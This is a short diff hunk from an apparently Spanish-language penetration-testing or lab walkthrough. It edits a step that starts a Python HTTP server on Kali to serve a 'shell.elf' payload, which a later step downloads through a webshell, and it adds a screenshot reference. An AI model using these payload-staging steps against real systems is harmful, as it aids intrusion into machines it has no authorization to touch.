@@ -698,12 +698,13 @@ ls -lh shell.elf
 
 #### Paso 1: Levantar servidor HTTP en Kali
 ```bash
-# En el directorio donde está shell.elf:
+# En nueva ventana de terminal de Kali (no cerrar proceso):
 python3 -m http.server 8000
 
 # Resultado:
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+![Levantamos servidor Python](img/servidor-python.jpg)
 
 #### Paso 2: Descargar desde webshell
 
